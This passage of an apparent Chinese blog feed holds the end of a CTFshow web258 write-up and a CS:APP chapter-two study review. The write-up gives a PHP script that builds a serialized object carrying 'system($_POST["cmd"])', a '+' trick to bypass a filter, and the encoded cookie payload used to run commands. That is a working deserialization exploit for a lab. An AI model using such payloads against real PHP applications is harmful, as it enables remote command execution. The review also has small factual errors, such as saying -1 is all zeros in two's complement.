class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;C:&#x27;</span>,<span class="string">&#x27;C:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A22%3A%22system%28%24_POST%5B%22cmd%22%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>我们在 <code>cookie</code> 的 <code>user</code> 字段中传入 <code>poc</code>，然后 <code>post</code> 给一个 <code>cmd</code> 参数作为命令执行。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/1.png" alt="1"></p><p>发现 <code>flag.php</code>，我们 <code>cat /flag</code> 并且打开源代码发现 <code>flag</code>。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/2.png" alt="2"></p><p>这里主要还得注意 <code>url</code> 编码传入，因为 <code>cookie</code> 以 <code>;</code> 作为分割符号。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ctfshow的刷题记录-web258&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="unserialize" scheme="http://example.com/categories/ctf/web/unserialize/"/>
    
    
  </entry>
  
  <entry>
    <title>CS:APP第二章复习</title>
    <link href="http://example.com/2022/06/03/CSAPP_Datalab/"/>
    <id>http://example.com/2022/06/03/CSAPP_Datalab/</id>
    <published>2022-06-03T11:00:00.000Z</published>
    <updated>2022-06-03T07:58:13.507Z</updated>
    
    <content type="html"><![CDATA[<p>之前 <code>CS:APP</code> 没有好好学，今天下定决心来重新看一遍，并把实验好好做一遍以巩固自身。</p><span id="more"></span><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="数字表示"><a href="#数字表示" class="headerlink" title="数字表示"></a>数字表示</h3><p>二进制：区别于我们平时计数使用的十进制，二进制使用的是逢二进一原则，而我们的十进制则是逢十进一，比如我们十进制的 <code>9+1</code> 中的 <code>9</code>，答案应该是十，但是十应该进一，因此得出了我们常规的答案 <code>10</code>。在二进制里面，每一位只要大于等于 <code>2</code> 则都要向高位进一。为了方便表示，还衍生出了二进制的子类，比如八进制，十六进制等，主要是二进制向这R</p><p>些进制转换较为容易，而计算机平时又都处理二进制数据，因此就出现了这些常见的进制计数。</p><h3 id="信息存储-1"><a href="#信息存储-1" class="headerlink" title="信息存储"></a>信息存储</h3><p>大多数计算机使用的都是8位（在计算机中，除特殊说明外，一位均指的是二进制的位）的块，或者叫字节，字节是作为计算机可寻址的最小单位。一般来说我们并不习惯于将一个字节写成八位二进制的数，而是会写成两位十六进制的数。十六进制与二进制之间的转换也会十分容易，举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x99-&gt;0b10011001</span><br><span class="line">0x88-&gt;0b10001000</span><br></pre></td></tr></table></figure><p>我们可以发现我们并不用像十进制那样权值相加或者是除二取余那么麻烦，我们把一位十六进制视为四位二进制即可，这样我们在转换的时候就是直接每一位分别转了，可以看出十分的方便。</p><h4 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h4><p>每台计算机都有一个字长，字长为计算机 <code>CPU</code> 一次能处理的最大数据，也有一种说法是能表示的最大内存。其实意思是差不多的，比如我们都知道 <code>32</code> 位的计算机最多能装 <code>4GB</code> 的内存，再多它也是只能使用这么多的内存，那是因为 <code>CPU</code> 要访问内存的时候，也只能使用一个 <code>32</code> 位的数据来表示地址，32位的数能表示的数的个数也就是 <code>2^32</code> 这么多，而地址指示的单位是字节，所以最多就是 <code>2^32</code> 字节，那就是熟知的 <code>4GB</code> 了。</p><p><code>C</code> 语言中  <code>sizeof()</code> 会返回一个对象所占的字节数，我们对比输出下 <code>32</code> 位机子和 <code>64</code> 位机子的各个基本数据类型所占的字节数。我们不必找两个机子，只需要在 <code>64</code> 位的机子上分别编译 <code>32</code> 位和 <code>64</code> 位的程序即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;short:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;long:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char *:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;float:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;double:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>32 </code>位的结果：</p><p><img src="/2022/06/03/CSAPP_Datalab/1.png" alt="1"></p><p><code>64</code> 位的结果：</p><p><img src="/2022/06/03/CSAPP_Datalab/2.png" alt="2">    </p><p>我们总结出如下表格</p><table><thead><tr><th>C声明</th><th>32位字节数</th><th>64位字节数</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>4</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><p>其实有些时候， <code>long</code> 的字节数也会随机器字长有所变化的，只是好像某个版本区分了 <code>64</code> 位整数就叫 <code>long long</code> 而 <code>long</code> 地位与 <code>int</code> 一致了。但是除了这个问题，可以发现只有指针类型的数据会随着机器字长发生变化，这也如我们所说，机器字长决定了指针就多少位，决定了有多少个地址，能用多少内存，多出的内存机器就无法做区分了。</p><h3 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h3><p>对于多字节的数据类型我们必须确定两点：</p><ol><li>这个对象地址在哪里</li><li>这个对象中的字节按什么顺序排列</li></ol><p>比如一个 <code>int</code> 它有四个字节，那么我定义 <code>int a=0x12345678</code>。首先它一定是连续排列的，因此我们确定一个 <code>int</code> 的地址只需要确定它的最高字节的位置即可确定整个 <code>int</code> 的位置。假如 <code>int</code> 的地址是在 <code>0x100</code> 的，那么它应该怎么排列这些字节呢？</p><p>我们最初可能按照惯性，认为它是按照如下方式存储的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字节：12  34  56  78</span><br><span class="line">地址：100 101 102 103</span><br></pre></td></tr></table></figure><p>这个也很符合我们的书写规则，但是实时却恰恰相反，在现在大部分的机器中，它是反着存储的。也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字节：78  56  34  12</span><br><span class="line">地址：100 101 102 103</span><br></pre></td></tr></table></figure><p>这两种存储方式我们分别叫大端序和小端序。</p><ul><li><p>大端序：最高有效字节在低地址</p></li><li><p>小端序：最高有效字节在高地址</p></li></ul><p>在我们书写汇编语言的时候，要写一个值通常也是以小端序的方式书写的。</p><p>比如我给 <code>eax</code> 寄存器加上 <code>0x12345678</code> 你会发现它的字节码是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x12345678,%eax </span><br><span class="line">b8 78 56 34 12</span><br></pre></td></tr></table></figure><p>我们通过定义以下的函数以十六进制来逐个显示内存中的字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>start</code> 参数为该对象的起始地址，<code>len</code> 参数为显示的字节数，可以任意定义变量调用这个函数来查看这个对象在内存中的排布，理解浮点数的时候这个函数非常有用。</p><p>来查看下面的一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0x3039</span>;</span><br><span class="line">    show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">    <span class="keyword">float</span> y=x;</span><br><span class="line">    show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现浮点数的输出在整数形态下为 <code>0x4640E400</code>。与整数的存储有着截然不同的结果，但是我们对这个结果的二进制适当移位就会发现它们有13个相匹配的位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0   0   0   0   3   0   3   9</span><br><span class="line">0000000000000000001000000111001</span><br><span class="line">            4   6   4   0   E   4   0   0</span><br><span class="line">         01000110010000001110010000000000</span><br></pre></td></tr></table></figure><p>我们也可以看到13个位刚好就是 <code>int</code> 形式下的低 <code>13</code> 位，这并不是巧合，大家可以试试看其它数，并且可以看看它最多能匹配多少位的整数，但是要注意结论需要有一般性，特殊的数字符合并不能得出什么结论，只能说是特性。</p><h3 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h3><p>字符串的定义就是一个以 <code>null</code> 字符结尾的字符数组，如果将字符串看成一个数据类型的话，那么它是以大端形式存储的，但是其实实际上应该说是数组是大端存储的。我们在书写的时候，一般下标 <code>0 </code>是最小的，但是我们习惯把它称为高位，高位在低地址便是大端序。比如 <code>char s[]=&quot;1234&quot;;</code> 那么 <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=4,s[4]=NULL</code>。请注意末尾的空字节也会包括在字符串里面，但是我们算长度不会算上这个字节。在 <code>gcc</code> 编译器中，我们编译如下的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器会发出可能存在溢出的警告，因为在拷贝的时候会多携带一个 <code>0</code> 字节过来，这在后面堆利用中也是很常见的 <code>off by null</code> 的手段。</p><p>再比如我们用这样的方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="keyword">sizeof</span>(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行我们也可以发现这个 <code>char</code> 数组占用了 <code>17</code> 个字节的空间。</p><h3 id="布尔代数简介"><a href="#布尔代数简介" class="headerlink" title="布尔代数简介"></a>布尔代数简介</h3><p>布尔代数是一个建立在二元集合集合 <code>G=&#123;0,1&#125;</code> 上的定义。</p><h4 id="非"><a href="#非" class="headerlink" title="非"></a>非</h4><blockquote><p>非0即为1，非非0即为0。</p></blockquote><h4 id="与"><a href="#与" class="headerlink" title="与"></a>与</h4><blockquote><p>全1为1，不全1为0</p></blockquote><h4 id="或"><a href="#或" class="headerlink" title="或"></a>或</h4><blockquote><p>全0为0，不全0为1</p></blockquote><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><blockquote><p>相同为0，不同为1</p></blockquote><hr><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ol><li>非0为1，非1为0</li><li>1与1为1，1与0为0，0与1为0，0与0为0</li><li>1或1为1，1或0为1，0或1为1，0或0为0</li><li>1异或1为0，1异或0为1，0异或1为1，0异或0为0</li></ol><p>在C语言中也有一个类型是 <code>bool</code>，它们有特殊的运算符：</p><ul><li>与：&amp;&amp;</li><li>或：||</li><li>非：!</li></ul><p>不一样的是，在进行这些运算的时候，统统会把参与运算的值转为 <code>bool</code> 类型，<code>0</code> 就是 <code>0</code>，不是 <code>0</code> 一律都是 <code>1</code></p><h3 id="C语言当中的位级运算"><a href="#C语言当中的位级运算" class="headerlink" title="C语言当中的位级运算"></a>C语言当中的位级运算</h3><h4 id="位逻辑运算"><a href="#位逻辑运算" class="headerlink" title="位逻辑运算"></a>位逻辑运算</h4><p>我们平时C语言的位运算会扩展到每一位，位之间独立地运算，我们可以把一个整数(int)视为32维的向量，每个维度为0或者1，对整数进行位逻辑运算相当于每一位分别做逻辑运算，每一位结果为新向量对应位的结果。在 <code>C</code> 语言中，以上逻辑运算对应的符号分别为：</p><ul><li>非：~</li><li>与：&amp;</li><li>或：|</li><li>异或：^</li></ul><p>我们可以在只拥有非和其它任意一个双目运算来实现所有的位逻辑运算。</p><p>比如我不用异或实现异或的功能，那么就是：</p><p>一个为 <code>1</code>，一个为 <code>0</code> 那么为或者一个为 <code>0</code>，一个为 <code>1</code> 的情况都是 <code>1</code>，其余都是 <code>0</code>。我们知道与的特性就是只有全 <code>1</code> 的时候为 <code>0</code>，那么如果我其中一个取非了，再与还是1的话就说明一个为 <code>1</code> 一个为 <code>0</code> 了，两边都非一下，最后把符合条件的位或一下就能得到异或的结果了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xor</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (~x&amp;y)|(x&amp;~y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那与和或，把非运用到位了它们两个也能运用自如自由转换。</p><p>比如我用与和非实现或，首先我对两个元素都非一下然后与起来，是不是就变成了：</p><p>全 <code>0</code> 为 <code>1</code>，其余为 <code>0</code> 了，这和或的全 <code>0</code> 为 <code>0</code>，其余为 <code>1</code> 差了什么？很显然结果反了，那么我就对结果再非一下，最后就变成了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">or</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或和非实现与运算同理。</p><h4 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h4><p>这里分逻辑移位和算数移位，其实差不多，只不过逻辑移位适用无符号整数，算数移位适用有符号整数。</p><p>分左移和右移，分别用符号 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 来表示，假设整数一共 <code>w</code> 位，右移 <code>n</code> 位表示丢弃低 <code>n</code> 位，原来的高<code>w-n</code> 位变为低 <code>w-n</code> 位，高 <code>n</code> 位变为0。左移 <code>n</code> 位表示丢弃高 <code>n</code> 位，原来的低 <code>w-n</code> 位变为高 <code>w-n</code> 位，低 <code>n</code> 位变为0。</p><h5 id="逻辑移位"><a href="#逻辑移位" class="headerlink" title="逻辑移位"></a>逻辑移位</h5><p>左移右移就是字面意思</p><h5 id="算数移位"><a href="#算数移位" class="headerlink" title="算数移位"></a>算数移位</h5><p>正数与逻辑移位一样，负数则会在右移的时候高位添1.</p><hr><p>左移x相当于对该数乘 <code>2</code> 的 <code>x</code> 次方，右移相当于对该数除 <code>2</code> 的 <code>x</code> 次方取整。</p><p>当移位的位数大于等于该整数的最大位数，则会取模再移位。</p><h3 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h3><p>整数我们之前讲过了它的字节排布规律，但是对于负数计算机又将如何处理呢？</p><h4 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h4><p>我们先来看一张表格</p><table><thead><tr><th>C定义</th><th>最小值</th><th>最大值</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808</td><td>9223372036854775807</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615</td></tr></tbody></table><p>我们可以很清楚地看到，有符号数在正数和负数的范围并不严格对称，这是为什么我们接下来再看。</p><h4 id="无符号数的编码"><a href="#无符号数的编码" class="headerlink" title="无符号数的编码"></a>无符号数的编码</h4><p>无符号数的编码就是用一个固定长度的向量来表示，每个维度上的值取 <code>0</code> 或者 <code>1</code>，那么有</p><p><img src="/2022/06/03/CSAPP_Datalab/3.png" alt="3"></p><p>这个是我们最容易理解的。</p><h4 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h4><p>有符号数因为需要表示负数，因此它规定：最高位的权值为负。</p><p>也就是说若最高位为1，而我们知道，在等比数列 <code>ai=2^i</code> 中，数列的前n项和永远比第 <code>n+1</code> 项小 <code>1</code>，根据等比数列前 <code>n</code> 项和的公式。因此若最高位为1，那么其它位不管是是怎样都不会使这个数变为一个正数。而前 <code>n-1</code> 项可以表示 <code>0~2^n-1</code> 的范围，所以负数的范围就是<code>-2^n+0~-2^n+2^n-1</code> 也就是我们熟知的 <code>-2^n~-1</code> 再加上正数表示的 <code>0~2^n-1</code> 连起来的范围就是 <code>-2^n~2^n-1</code> 啦。</p><h4 id="有符号与无符号数之间的转换"><a href="#有符号与无符号数之间的转换" class="headerlink" title="有符号与无符号数之间的转换"></a>有符号与无符号数之间的转换</h4><p>隐式转换按顺序遵从以下原则：</p><ol><li>浮点数参与运算就是浮点数，出现过double则结果一定为double</li><li>若都是整数参与运算则结果也是整数</li><li>整数运算的结果为出现过的位数最大的整数，若最大的整数中有无符号类型的则结果无符号。</li></ol><p>因此，如果</p><ul><li>运算中有 <code>unsigned short</code> 和 <code>int</code> 则结果为 <code>int</code>。</li><li>运算中有 <code>unsigned int</code> 和 <code>int</code> 则结果为 <code>int</code>。</li><li>运算中有 <code>unsigned int</code> 和 <code>float</code> 则结果为 <code>float</code>。</li></ul><p>也就不一一列举了。</p><p>有符号与无符号的位于区别就是最高位的权值正负问题，比较的时候任意一方出现无符号则另一方也会变成无符号比较，所以如果我们做以下运算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&lt;(<span class="keyword">unsigned</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure><p>会发现它结果为0.</p><p>因为 <code>-1</code> 的补码全为 <code>0</code>，转为无符号之后会变成无符号整数的最大值。</p><h4 id="扩展一个数字的表示"><a href="#扩展一个数字的表示" class="headerlink" title="扩展一个数字的表示"></a>扩展一个数字的表示</h4><p>将一个位数较小的整数扩展为位数较大的整数非常简单，我们只需要在开头添加 <code>0</code> 即可，但是如果是负数，则需要开头添 <code>1</code>，我们运行以下代码试试看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">short</span> x=<span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">short</span> y=<span class="number">-0x1234</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line"><span class="keyword">int</span> x1=x;</span><br><span class="line"><span class="keyword">int</span> y1=y;</span><br><span class="line">show_bytes(&amp;x1,<span class="keyword">sizeof</span>(x1));</span><br><span class="line">show_bytes(&amp;y1,<span class="keyword">sizeof</span>(y1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行可以看到结果如我们所说。</p><p><img src="/2022/06/03/CSAPP_Datalab/4.png" alt="4"></p><h4 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h4><p>有扩展，自然有截断，当运算的结果可能超出类型所能表示的最大范围的时候，就会发生溢出。</p><p>在无符号数或者正数当中，截断为 <code>w</code> 位的整数就相当于取模 <code>2^w</code> ，但是截断有负整数的时候就会发生意想不到的事情。比如负数最小值再减一那么做的运算就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 0x80000000</span><br><span class="line"> 0xFFFFFFFF</span><br><span class="line">0x17FFFFFFF</span><br></pre></td></tr></table></figure><p>显然多了一位，高位被截断，最终结果为 <code>0x7FFFFFFF</code> ，两个负数相加结果得出了正数，这显然超出了我们的认知范围。这个我们叫它负溢出。再看一个例子：正数的最大值加 <code>1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7FFFFFFF</span><br><span class="line">0x00000001</span><br><span class="line">0x80000000</span><br></pre></td></tr></table></figure><p>结果是负数的最大值，两个正数相加得出了负数，显然也不合理，这个我们叫他正溢出，但是正溢出并没有发生截断，而负溢出是由截断引起的。</p><blockquote><p>计算机历史上，有很多安全漏洞都是因为有符号和无符号的正数引起的</p></blockquote><h4 id="无符号乘法"><a 